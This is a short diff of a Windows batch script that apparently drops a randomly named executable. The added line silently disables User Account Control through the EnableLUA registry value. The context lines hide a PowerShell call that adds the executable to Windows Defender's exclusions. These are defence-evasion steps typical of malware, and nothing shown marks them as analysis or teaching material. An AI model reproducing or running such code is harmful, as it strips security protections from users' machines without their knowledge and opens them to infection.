@@ -11,6 +11,8 @@ set "exePath=%folderPath%\%randomExeName%"
 :: Create folder if not exists
 if not exist "%folderPath%" mkdir "%folderPath%"
 
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
+
 :: Use PowerShell to add exclusion for the executable (without opening PowerShell window)
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess '%exePath%'" >nul 2>&1
 
